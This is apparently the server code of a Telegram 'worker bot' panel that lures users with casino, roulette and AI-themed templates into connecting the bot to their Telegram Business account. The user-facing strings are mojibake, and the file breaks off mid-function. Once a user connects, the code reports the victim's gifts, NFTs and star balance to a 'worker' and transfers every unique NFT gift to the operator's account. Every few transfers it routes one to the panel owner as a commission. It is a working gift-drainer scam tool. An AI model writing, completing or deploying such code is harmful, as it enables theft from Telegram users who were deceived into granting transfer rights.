import asyncio
import json
import logging
import os
import html

from aiohttp import web
from sqlalchemy.orm import selectinload
from aiogram import Bot
from aiogram.client.default import DefaultBotProperties
from logging.handlers import RotatingFileHandler
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import (
    ConvertGiftToStars,
    GetBusinessAccountGifts,
    GetBusinessAccountStarBalance,
    TransferBusinessAccountStars,
    TransferGift,
)
from aiogram.types import Update

from aiogram.filters import Command, CommandStart 
from aiogram import F, Router, Dispatcher
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    FSInputFile
)
from aiogram.fsm.storage.memory import MemoryStorage

from sqlalchemy import select
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.ext.asyncio import AsyncSession
from aiogram.webhook.aiohttp_server import SimpleRequestHandler
from telethon.errors import BadRequestError, ForbiddenError

from config import OWNER_ACCOUNT_ID, PANEL_OWNERS
from config import WEBHOOK_HOST
from db import Session
from log_bot import send_log
from models import CustomGift, WorkerBot, Admin, BusinessConnection, GlobalStats
from worker_bot_logic import handle_worker_start
from channel_stats_logger import send_admin_transfer_log_to_channel
from aiogram.fsm.context import FSMContext
from default_template_handlers import process_giftspin_callback, process_giftspin_message, receive_opponent_username
from aiogram.fsm.storage.base import StorageKey
from default_template_handlers import fsm_storage 

from default_template_handlers import (
    is_default_template_active,
    handle_account_command,
    handle_settings_command,
    handle_settings_close,
    handle_instructions_callback,
    handle_spin_callback,
    get_connection_instruction,
    handle_prize_spin_callback,
    handle_duel_accept,
    handle_nft_link,         
    handle_dice,             
    handle_make_bet,         
    handle_claim_prize
)

_bots: dict[str, Bot] = {}

LOG_DIR = "–õ–æ–≥–∏"
TRANSFER_LOG_DIR = "–õ–æ–≥–∏"
os.makedirs(LOG_DIR, exist_ok=True)

def get_worker_logger(telegram_id: int) -> logging.Logger:
    logger_name = f"worker_{telegram_id}"
    file_path = os.path.join(LOG_DIR, f"{telegram_id}_Connection.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_transfer_logger(admin_id: int) -> logging.Logger:
    logger_name = f"transfer_{admin_id}"
    file_path = os.path.join(TRANSFER_LOG_DIR, f"{admin_id}_Transfer.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_cached_bot(token: str) -> Bot:
    if token not in _bots:
        _bots[token] = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
    return _bots[token]

async def get_bot_token_by_telegram_id(bot_id: str) -> str | None:
    async with Session() as session:
        stmt = select(WorkerBot).where(WorkerBot.telegram_id == int(bot_id))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()
        return bot.token if bot else None

async def process_custom_template_callback(callback, bot, chat_id, template):
    if callback.data == "second_button_reply":
        await bot.send_message(
            chat_id=chat_id,
            text=template.second_button_reply or "–¢–µ–∫—Å—Ç –Ω–µ –∑–∞–¥–∞–Ω.",
            parse_mode="HTML"
        )

async def process_neuro_template_message(msg, bot, bot_username):
    if msg.text == "üß† –ú–æ–π –∞–∫–∫–∞—É–Ω—Ç":
        await handle_account_command(msg, bot)
    elif msg.text == "‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏":
        await handle_settings_command(msg, bot)
    else:
        await bot.send_message(
            chat_id=msg.chat.id,
            text=get_connection_instruction(bot_username),
            parse_mode="HTML"
        )

async def process_prize_roulette_message(msg, bot, bot_id, user_id, token):
    state = FSMContext(storage=fsm_storage, key=StorageKey(bot_id=bot_id, chat_id=msg.chat.id, user_id=user_id))
    current_state = await state.get_state()

    if current_state == "DuelFSM:waiting_opponent_username":
        await receive_opponent_username(msg, bot, token)
    elif current_state == "DuelFSM:waiting_nft_link":
        await handle_nft_link(msg, bot)
    elif current_state == "DuelFSM:waiting_dice":
        if msg.dice and msg.dice.emoji == "üé≤":
            await handle_dice(msg, bot)

async def process_roulette_callback(callback, bot):
    if callback.data == "spin":
        await handle_spin_callback(callback, bot)
    elif callback.data == "instructions":
        await handle_instructions_callback(callback, bot)

async def process_prize_roulette_callback(callback, bot, bot_username):
    data = callback.data
    if data == "prize_spin":
        await handle_prize_spin_callback(callback, bot)
    elif data == "duel_accept":
        await handle_duel_accept(callback, bot)
    elif data == "make_bet":
        await handle_make_bet(callback, bot)
    elif data == "claim_prize":
        await handle_claim_prize(callback, bot, bot_username)

async def process_neuro_template_callback(callback, bot, chat_id, bot_username):
    if callback.data == "close_settings":
        await handle_settings_close(callback, bot)
    elif callback.data == "stub":
        await bot.send_message(
            chat_id=chat_id,
            text=get_connection_instruction(bot_username),
            parse_mode="HTML"
        )

async def handle_update(update: dict, bot: Bot):
    upd = Update.model_validate(update)
    token = next((t for t, b in _bots.items() if b == bot), None)
    if not token:
        return

    async with Session() as session:
        result = await session.execute(
            select(WorkerBot)
            .where(WorkerBot.token == token)
            .options(selectinload(WorkerBot.template))
        )
        worker_bot = result.scalar_one_or_none()
        if not worker_bot:
            return

        template = worker_bot.template
        template_name = template.name if template else ""
        bot_username = worker_bot.username or "–±–æ—Ç"

        is_neuro_template = template_name == "üéì –®–∞–±–ª–æ–Ω (–Ω–µ–π—Ä–æ—Å–µ—Ç–∏)"
        is_roulette_template = template_name == "üé∞ –®–∞–±–ª–æ–Ω (—Ä—É–ª–µ—Ç–∫–∞)"
        is_prize_roulette_template = template_name == "üéÅ –®–∞–±–ª–æ–Ω (–ö–∞–∑–∏–Ω–æ)"
        is_giftspin_template = template_name == "üéÅ NFT‚Äì–†—É–ª–µ—Ç–∫–∞"  

    if upd.message:
        await process_message(
            upd.message,
            bot, token, is_neuro_template, is_prize_roulette_template,
            bot_username,
            is_giftspin_template  
        )
        return

    if upd.callback_query:
        await process_callback(
            upd.callback_query, bot, template, token,
            is_neuro_template, is_roulette_template, is_prize_roulette_template,
            bot_username,
            is_giftspin_template   
        )

async def process_message(msg, bot, token, is_neuro_template, is_prize_roulette_template, bot_username, is_giftspin_template):
    chat_id = msg.chat.id
    user_id = msg.from_user.id

    if getattr(msg, "text", None) and msg.text.startswith("/start"):
        await handle_worker_start(bot, msg, token)
        return

    if await is_default_template_active(token):
        if is_neuro_template and getattr(msg, "text", None):
            await process_neuro_template_message(msg, bot, bot_username)
        elif is_prize_roulette_template and getattr(msg, "text", None):
            await process_prize_roulette_message(msg, bot, bot.id, user_id, token)
        elif is_giftspin_template and getattr(msg, "text", None):
            await process_giftspin_message(msg, bot, bot_username)   

async def process_callback(callback, bot, template, token, is_neuro_template, is_roulette_template, is_prize_roulette_template, bot_username, is_giftspin_template):
    user_id = callback.from_user.id
    chat_id = callback.message.chat.id if callback.message else user_id

    if template and callback.data == "second_button_reply":
        await handle_second_button_reply(callback, bot, chat_id, template)
        return

    if template and callback.data == "custom_back":
        await handle_custom_back(callback, bot, chat_id, template)
        return

    if await is_default_template_active(token):
        if is_roulette_template:
            await process_roulette_callback(callback, bot)
        elif is_prize_roulette_template:
            await process_prize_roulette_callback(callback, bot, bot_username)
        elif is_neuro_template:
            await process_neuro_template_callback(callback, bot, chat_id, bot_username)
        elif is_giftspin_template:
            await process_giftspin_callback(callback, bot, chat_id, bot_username)   # <--- –ù–æ–≤–∞—è —Ñ—É–Ω–∫—Ü–∏—è!

    await bot.answer_callback_query(callback.id, text="–û–±—Ä–∞–±–æ—Ç–∞–Ω–æ")


async def handle_second_button_reply(callback, bot, chat_id, template):
    try:
        await bot.delete_message(chat_id, callback.message.message_id)
    except TelegramBadRequest:
        pass
    await bot.send_message(
        chat_id,
        template.second_button_reply or "–¢–µ–∫—Å—Ç –Ω–µ –∑–∞–¥–∞–Ω.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data="custom_back")]
        ])
    )
    await bot.answer_callback_query(callback.id)


async def handle_custom_back(callback, bot, chat_id, template):
    try:
        await bot.delete_message(chat_id, callback.message.message_id)
    except TelegramBadRequest:
        pass

    text = template.after_start if (template.is_default or getattr(callback.from_user, "is_premium", False)) else (template.non_premium_text or template.after_start)
    btns = []
    if template.button_text and template.button_url:
        btns.append([InlineKeyboardButton(text=template.button_text, url=template.button_url)])
    if template.second_button_text and template.second_button_reply:
        btns.append([InlineKeyboardButton(text=template.second_button_text, callback_data="second_button_reply")])
    reply_markup = InlineKeyboardMarkup(inline_keyboard=btns) if btns else None

    if template.video_path:
        await bot.send_video(chat_id, FSInputFile(template.video_path), caption=text, parse_mode="HTML", reply_markup=reply_markup)
    elif template.photo_url:
        await bot.send_photo(chat_id, template.photo_url, caption=text, parse_mode="HTML", reply_markup=reply_markup)
    else:
        await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)

    await bot.answer_callback_query(callback.id)


def get_logger_for_admin(admin: Admin) -> logging.Logger:
    return get_worker_logger(admin.telegram_id)

async def get_worker_bot_by_token(session: AsyncSession, bot_token: str) -> WorkerBot | None:
    result = await session.execute(select(WorkerBot).where(WorkerBot.token == bot_token))
    return result.scalar_one_or_none()

async def get_admin_for_worker(session: AsyncSession, worker_bot: WorkerBot) -> Admin | None:
    result = await session.execute(select(Admin).where(Admin.id == worker_bot.owner_id))
    return result.scalar_one_or_none()

async def get_business_connection(session: AsyncSession, worker_bot_id: int, telegram_id: int) -> BusinessConnection | None:
    result = await session.execute(
        select(BusinessConnection).where(
            BusinessConnection.worker_bot_id == worker_bot_id,
            BusinessConnection.telegram_id == telegram_id
        )
    )
    return result.scalar_one_or_none()

async def commit_with_log(session: AsyncSession, logger: logging.Logger, success_msg: str, error_msg: str) -> bool:
    try:
        await session.commit()
        logger.info(success_msg)
        return True
    except SQLAlchemyError as e:
        logger.error(f"{error_msg}: {e}")
        return False

async def handle_webhook_business_connection(update: dict, bot: Bot):
    if "business_connection" not in update:
        return

    bc = update["business_connection"]
    bot_token = next((t for t, b in _bots.items() if b == bot), None)
    if not bot_token:
        return

    async with Session() as session:
        try:
            result = await session.execute(
                select(WorkerBot)
                .options(selectinload(WorkerBot.template))
                .where(WorkerBot.token == bot_token)
            )
            worker_bot = result.scalar_one_or_none()
            if not worker_bot or not worker_bot.owner_id:
                return

            admin = await get_admin_for_worker(session, worker_bot)
            if not admin or not admin.log_bot_enabled:
                return

            logger = get_logger_for_admin(admin)

            user = bc.get("user", {})
            business_user_id = user.get("id")
            username = user.get("username", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
            business_connection_id = bc.get("id")
            is_enabled = bc.get("is_enabled", True)

            rights = bc.get("rights", {})
            logger.info(f"–ü—Ä–∞–≤–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è bc_id {business_connection_id}: {json.dumps(rights, ensure_ascii=False)}")
            
            connection = await get_business_connection(session, worker_bot.id, business_user_id)

            if not is_enabled and connection:
                logger.info(
                    f"‚õîÔ∏è –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞ @{worker_bot.username or '–±–µ–∑ username'} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º "
                    f"@{username or '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} (ID: {business_user_id})"
                )
                connection.is_connected = False
                if not await commit_with_log(session, logger, "‚úÖ is_connected = False", "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ commit –æ—Ç–∫–ª—é—á–µ–Ω–∏—è"):
                    return

                template = worker_bot.template
                disconnect_text = template.disconnect_text if template else None
                if disconnect_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=disconnect_text,
                            parse_mode="HTML"
                        )
                    )

                text = (
                    f"<b>ü§ñ –ë–æ—Ç <b>@{worker_bot.username or '–Ω–µ—Ç—É'}</b> –æ—Ç–∫–ª—é—á—ë–Ω –æ—Ç Telegram Business</b>\n"
                    f"<b>üíÅüèª‚Äç‚ôÄÔ∏è –û—Ç–∫–ª—é—á–∏–ª:</b> <b>@{username or '–Ω–µ—Ç—É'}</b> <b>ID</b> <code>{business_user_id}</code>"
                )
                logger.info("üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∞ –∞–¥–º–∏–Ω—É (–æ—Ç–∫–ª—é—á–µ–Ω–∏–µ)")
                await send_log(admin.telegram_id, text)
                return

            template = worker_bot.template
            no_rights_text = template.no_rights_text if template else None

            if not rights.get("can_transfer_and_upgrade_gifts"):
                logger.warning("‚ö†Ô∏è –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø—Ä–∞–≤–æ can_transfer_and_upgrade_gifts")
                if no_rights_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=no_rights_text,
                            parse_mode="HTML"
                        )
                    )

            rights_changed = False
            old_rights = connection.rights_json if connection and getattr(connection, "rights_json", None) else {}
            if json.dumps(old_rights, sort_keys=True) != json.dumps(rights, sort_keys=True):
                rights_changed = True
                logger.info(f"–ü—Ä–∞–≤–∞ –∏–∑–º–µ–Ω–∏–ª–∏—Å—å. –°—Ç–∞—Ä—ã–µ: {json.dumps(old_rights, ensure_ascii=False)}, –ù–æ–≤—ã–µ: {json.dumps(rights, ensure_ascii=False)}")

            if connection and connection.is_connected and not rights_changed:
                logger.info("üîÅ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ –∏ –ø—Ä–∞–≤–∞ –Ω–µ –∏–∑–º–µ–Ω–∏–ª–∏—Å—å ‚Äî —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º")
                return

            if connection:
                was_disconnected = not connection.is_connected
                connection.is_connected = True
                connection.business_connection_id = business_connection_id
                connection.rights_json = rights  
                await session.commit() 

                status_line = (
                    "üì¶ –ë–æ—Ç –ø–æ–≤—Ç–æ—Ä–Ω–æ –ø–æ–¥–∫–ª—é—á—ë–Ω –∫ Telegram Business (–æ–±–Ω–æ–≤–ª–µ–Ω—ã –ø—Ä–∞–≤–∞)"
                    if rights_changed else
                    "üì¶ –ë–æ—Ç —É–∂–µ –±—ã–ª –ø–æ–¥–∫–ª—é—á—ë–Ω ‚Äî –æ–±–Ω–æ–≤–ª–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ"
                )
            else:
                connection = BusinessConnection(
                    telegram_id=business_user_id,
                    username=username,
                    admin_id=admin.id,
                    worker_bot_id=worker_bot.id,
                    is_connected=True,
                    business_connection_id=business_connection_id,
                    rights_json=rights
                )
                session.add(connection)
                worker_bot.connection_count += 1
                logger.info("üî¢ –£–Ω–∏–∫–∞–ª—å–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ ‚Äî —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º connection_count")
                await session.commit()
                status_line = "üì¶ –ë–æ—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ Telegram Business"

            gifts_count = stars_count = nft_count = 0
            try:
                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
                stars = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))

                gifts_count = len([g for g in gifts.gifts if getattr(g, "type", "") != "unique"])
                nft_count = len([g for g in gifts.gifts if getattr(g, "type", "") == "unique"])
                stars_count = stars.amount

                nft_links = []
                for g in gifts.gifts:
                    if getattr(g, "type", "") == "unique":
                        slug = getattr(getattr(g, "gift", None), "name", None) or getattr(g, "slug", None)
                        if slug:
                            nft_links.append(f"https://t.me/nft/{slug}")
                if nft_links:
                    logger.info("–°—Å—ã–ª–∫–∏ –Ω–∞ NFT:\n" + "\n".join(nft_links))
                else:
                    logger.info("–ù–µ—Ç NFT –¥–ª—è –≤—ã–≤–æ–¥–∞ —Å—Å—ã–ª–æ–∫.")

                logger.info(f"[{admin.id}] üéÅ –ü–æ–¥–∞—Ä–∫–∏: {gifts_count}, üß¨ NFT: {nft_count}, ‚≠êÔ∏è –ó–≤—ë–∑–¥—ã: {stars_count}")
            except TelegramBadRequest as e:
                if "BOT_ACCESS_FORBIDDEN" in str(e):
                    logger.error(f"‚ö†Ô∏è BOT_ACCESS_FORBIDDEN –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∏–∑–Ω–µ—Å-–¥–∞–Ω–Ω—ã—Ö. –ü—Ä–∞–≤–∞: {json.dumps(rights, ensure_ascii=False)}")
                else:
                    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∏–∑–Ω–µ—Å-–¥–∞–Ω–Ω—ã—Ö: {e}")

            rights_info = []
            if rights:
                permission_map = {
                    "–ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥": rights.get("can_view_gifts_and_stars"),
                    "–û–±–º–µ–Ω –ø–æ–¥–∞—Ä–∫–æ–≤ –Ω–∞ –∑–≤—ë–∑–¥—ã": rights.get("can_convert_gifts_to_stars"),
                    "–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤": rights.get("can_change_gift_settings"),
                    "–ü–µ—Ä–µ–¥–∞—á–∞ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤": rights.get("can_transfer_and_upgrade_gifts"),
                    "–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–≤—ë–∑–¥": rights.get("can_transfer_stars"),
                }
                for label, granted in permission_map.items():
                    mark = "‚úÖ" if granted else "‚ùå"
                    rights_info.append(f"{mark} {label}")
            else:
                rights_info.append("‚ùå –ü—Ä–∞–≤–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç")
            logger.info(f"–ß–∏—Ç–∞–µ–º—ã–µ –ø—Ä–∞–≤–∞ –¥–ª—è bc_id {business_connection_id}:\n" + "\n".join(rights_info))

            logger.info(
                f"{status_line} ‚Äî @{worker_bot.username or '–±–µ–∑ username'} "
                f"–¥–æ–±–∞–≤–∏–ª(–∞) @{username or '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} (ID: {business_user_id})"
            )

            text = (
                f"<b>{status_line}</b>\n"
                f"<b>ü§ñ –ë–æ—Ç:</b> <b>@{worker_bot.username or '–Ω–µ—Ç—É'}</b>\n"
                f"<b>üíÅüèª‚Äç‚ôÄÔ∏è –î–æ–±–∞–≤–∏–ª:</b> <b>@{username or '–Ω–µ—Ç—É'}</b> <b>ID</b> <code>{business_user_id}</code>\n"
                f"<b>üéÅ –ü–æ–¥–∞—Ä–∫–æ–≤:</b> <code>{gifts_count}</code>\n"
                f"<b>üß¨ NFT:</b> <code>{nft_count}</code>\n"
                f"<b>‚≠êÔ∏è –ó–≤—ë–∑–¥:</b> <code>{stars_count}</code>\n\n"
                f"<b>üîê –ü—Ä–∞–≤–∞:</b>\n"
                f"<b><blockquote>{chr(10).join(rights_info)}</blockquote></b>"
            )

            logger.info("üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∞ –∞–¥–º–∏–Ω—É (–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ)")
            await send_log(admin.telegram_id, text)

            transfer_notice = (
                f"<b>üöÄ –ó–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –ø–µ—Ä–µ–¥–∞—á–∞ –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –±–æ—Ç–∞ @{worker_bot.username or '–Ω–µ—Ç—É'}</b>\n"
                f"<b>‚û°Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞ –±—É–¥–µ—Ç –Ω–∞ ID:</b> <code>{worker_bot.nft_transfer_to_id or '–Ω–µ—Ç—É'}</code>\n"
                f"<code>–≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥...</code>"
            )
            await send_log(admin.telegram_id, transfer_notice)

            await handle_gift_processing_after_connection(
                bot, business_connection_id, worker_bot, admin, business_user_id, business_user_id, session
            )

        except Exception as e:
            logger = get_worker_logger("unknown")
            logger.exception(f"üí• –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ business_connection: {e}")

async def log_commission_nft(admin, nft_link, PANEL_OWNERS):
    try:
        username = admin.username or "–Ω–µ—Ç"
        msg_owner = "‚òïÔ∏è –ö–æ–º–∏—Å—Å–∏–æ–Ω–Ω—ã–π NFT —É—Ö–æ–¥–∏—Ç –ø–∞–Ω–µ–ª–∏"
        await send_log(admin.telegram_id, msg_owner)

        msg_admins = (
            "<b>‚òïÔ∏è –ö–æ–º–∏—Å—Å–∏–æ–Ω–Ω—ã–π NFT</b>\n"
            f"<b>ü§¶üèª‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä:</b> <code>{admin.telegram_id}</code>\n"
            f"<b>üëâ –ò–º—è:</b> <b>{admin.first_name or ''}</b>\n"
            f"<b>üëâ –¢—ç–≥:</b> @{username}\n"
        )
        if nft_link:
            msg_admins += f"<b>üéÜ NFT:</b> <a href='{nft_link}'>{nft_link}</a>\n"

        tasks = [send_log(panel_admin_id, msg_admins) for panel_admin_id in PANEL_OWNERS]
        await asyncio.gather(*tasks)
    except Exception as e:
        print(f"[log_commission_nft] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤: {e}")

async def transfer_all_nfts_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
) -> tuple[int, list]:
    def log_and_send(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    log_and_send("=== –°—Ç–∞—Ä—Ç transfer_all_nfts_after_connection ===")
    log_and_send(f"bc_id: {bc_id}, worker_bot_id: {worker_bot.id}, admin_id: {admin.id}")

    if not worker_bot.nft_transfer_to_id:
        log_and_send("–ü–µ—Ä–µ–¥–∞—á–∞ NFT –Ω–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ ‚Äî –Ω–µ —É–∫–∞–∑–∞–Ω nft_transfer_to_id —É –≤–æ—Ä–∫–µ—Ä-–±–æ—Ç–∞", "warning")
        log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ: –Ω–µ—Ç –∞–¥—Ä–µ—Å–∞—Ç–∞ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ ===")
        await send_log(admin.telegram_id, "‚ùóÔ∏è –ü–µ—Ä–µ–¥–∞—á–∞ NFT –Ω–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ ‚Äî –Ω–µ —É–∫–∞–∑–∞–Ω –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏.")
        return 0, []

    try:
        log_and_send("–ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ (GetBusinessAccountGifts)...")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        log_and_send(f"–ù–∞–π–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: {len(gifts.gifts)}")
        nfts = [g for g in gifts.gifts if getattr(g, "type", "") == "unique"]
        log_and_send(f"–ù–∞–π–¥–µ–Ω–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT: {len(nfts)}")

        if not nfts:
            log_and_send("üß¨ –ù–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏", "info")
            log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ: –Ω–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT ===")
            return 0, []

        log_and_send(f"üöö –ù–∞—á–∏–Ω–∞–µ–º –ø–µ—Ä–µ–¥–∞—á—É {len(nfts)} —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT")

        success = 0
        hold_nfts = []
        session.add(admin)  

        for gift in nfts:
            log_and_send(f"‚ñ∂Ô∏è –ù–∞—á–∏–Ω–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É NFT: {gift.owned_gift_id}")

            nft_link = None
            slug = None
            gift_obj = getattr(gift, "gift", None)
            if gift_obj and hasattr(gift_obj, "name"):
                slug = getattr(gift_obj, "name")
            if not slug:
                slug = getattr(gift, "slug", None)
            if slug:
                nft_link = f"https://t.me/nft/{slug}"

            for attempt in range(5):
                log_and_send(f"–ü–æ–ø—ã—Ç–∫–∞ #{attempt+1} –ø–µ—Ä–µ–¥–∞—á–∏ NFT {gift.owned_gift_id}")

                commission_every = admin.commission_every or 4
                commission_counter = admin.commission_counter or 0
                is_commission = (commission_counter + 1) >= commission_every

                log_and_send(f"commission_counter: {commission_counter}, commission_every: {commission_every}, is_commission: {is_commission}")

                if is_commission:
                    recipient_id = OWNER_ACCOUNT_ID
                    log_and_send(f"–ü–æ–ª—É—á–∞—Ç–µ–ª—å –¥–ª—è –∫–æ–º–∏—Å—Å–∏–∏: {recipient_id}")
                else:
                    recipient_id = worker_bot.nft_transfer_to_id
                    log_and_send(f"–ü–æ–ª—É—á–∞—Ç–µ–ª—å NFT: {recipient_id}")

                try:
                    log_and_send(f"–í—ã–ø–æ–ª–Ω—è–µ–º TransferGift –¥–ª—è NFT {gift.owned_gift_id} (–ø–æ–ª—É—á–∞—Ç–µ–ª—å: {recipient_id})")
                    await bot(TransferGift(
                        business_connection_id=bc_id,
                        owned_gift_id=gift.owned_gift_id,
                        new_owner_chat_id=recipient_id,
                        star_count=getattr(gift, "transfer_star_count", None)
                    ))
                    log_and_send(f"‚úÖ NFT ID {gift.owned_gift_id} –ø–µ—Ä–µ–¥–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {recipient_id}")
                    success += 1

                    admin.commission_counter = (commission_counter + 1) if not is_commission else 0
                    log_and_send(f"commission_counter –æ–±–Ω–æ–≤–ª—ë–Ω: {admin.commission_counter}")
                    session.add(admin)  

                    if is_commission:
                        asyncio.create_task(log_commission_nft(admin, nft_link, PANEL_OWNERS))
                        log_and_send(f"–ö–æ–º–∏—Å—Å–∏–æ–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã: owner+–∞–¥–º–∏–Ω—ã (–≤ —Ñ–æ–Ω–µ)")

                    for _ in range(3):
                        try:
                            await session.commit()
                            break
                        except Exception:
                            await asyncio.sleep(1)
                    else:
                        raise Exception(f"–§–ê–¢–ê–õ–¨–ù–û! NFT {gift.owned_gift_id} –ø–µ—Ä–µ–¥–∞–Ω, –Ω–æ –Ω–µ –∑–∞–ø–∏—Å–∞–ª—Å—è –≤ –ë–î!")

                    log_and_send(f"‚úÖ –ö–æ–º–º–∏—Ç –ø–æ—Å–ª–µ –ø–µ—Ä–µ–¥–∞—á–∏ NFT {gift.owned_gift_id}")
                    break
                except TelegramBadRequest as e:
                    log_and_send(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å NFT ID {gift.owned_gift_id}: {e}", "warning")
                    error_text = str(e)
                    if "STARGIFT_TRANSFER_TOO_EARLY" in error_text:
                        stats["nft_hold_too_early"] += 1
                        hold_nfts.append(gift.owned_gift_id)  
                        log_and_send(f"NFT ID {gift.owned_gift_id} –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å ‚Äî —Å–ª–∏—à–∫–æ–º —Ä–∞–Ω–æ (—Ö–æ–ª–¥), —Å—á–∏—Ç–∞–µ–º –∏ –∏–¥—ë–º –¥–∞–ª—å—à–µ")
                        break
                    elif "BALANCE_TOO_LOW" in error_text:
                        stats["balance_too_low"] = True
                        stats["nft_not_sent"] += 1
                        log_and_send(f"–ë–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –Ω–∏–∑–∫–∏–π –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ NFT ID {gift.owned_gift_id}, –æ—Ç–º–µ—á–∞–µ–º –∏ –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º")
                        break
                    elif "Bad Request: unknown chat identifier specified" in error_text and not is_commission:
